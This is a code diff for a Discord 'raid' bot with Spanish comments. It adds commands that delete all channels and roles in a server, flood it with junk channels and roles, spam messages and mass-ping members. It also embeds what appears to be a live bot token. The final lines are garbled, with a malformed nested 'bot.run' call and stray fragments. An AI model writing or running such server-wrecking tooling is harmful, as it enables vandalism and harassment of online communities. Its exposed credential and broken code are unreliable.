@@ -3,11 +3,6 @@ from discord.ext import commands
 import asyncio
 import random
 import string
-import os
-
-TOKEN = os.getenv("MTUwNDAwODEwMDk0NzAzNDE1Mg.GyhcVR.A5D2lz1PPgI0A60gWDkBhQJx_manR6A7o1OBx0")
-if not TOKEN:
-    raise ValueError("DISCORD_TOKEN environment variable is not set")
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
@@ -35,6 +30,71 @@ async def raid(ctx, canales: int = 80):
                 await channel.send(SPAM_MSG)
                 await asyncio.sleep(DELAY)
             except:
+                pass
+
+    # CREAR CANALES MASIVOS
+    for i in range(canales):
+        try:
+            name = ''.join(random.choices(string.ascii_lowercase + "mcraid", k=15))
+            await guild.create_text_channel(f"raided-by-mc-raid-{name}")
+        except:
+            pass
+
+    print("✅ RAID TERMINADO")
+
+@bot.command()
+async def nuke(ctx):
+    await ctx.message.delete()
+    guild = ctx.guild
+    print(f"☢️ NUKE TOTAL EN: {guild.name}")
+
+    # BORRAR TODO
+    for channel in list(guild.channels):
+        try:
+            await channel.delete()
+        except:
+            pass
+
+    # BORRAR ROLES
+    for role in guild.roles:
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+            except:
+                pass
+
+    # CREAR ROLES CAOS
+    for i in range(50):
+        try:
+            await guild.create_role(name=f"RAIDED-BY-MC-RAID-{i}", color=discord.Color.random())
+        except:
+            pass
+
+    await raid(ctx, 120)
+
+@bot.command()
+async def spam(ctx, cantidad: int = 200):
+    await ctx.message.delete()
+    for _ in range(cantidad):
+        try:
+            await ctx.send(SPAM_MSG)
+            await asyncio.sleep(0.08)
+        except:
+            break
+
+@bot.command()
+async def massping(ctx):
+    await ctx.message.delete()
+    members = [m.mention for m in ctx.guild.members if not m.bot][:80]
+    ping = " ".join(members)
+    for _ in range(25):
+        try:
+            await ctx.send(f"{ping}\n{SPAM_MSG}")
+            await asyncio.sleep(0.4)
+        except:
+            pass
+
+bot.run(os.getenv("bot.run("MTUwNDAwODEwMDk0NzAzNDE1Mg.GyhcVR.A5D2lz1PPgI0A60gWDkBhQJx_manR6A7o1OBx0")"))            except:
                 pass
 
     # CREAR CANALES MASIVOS
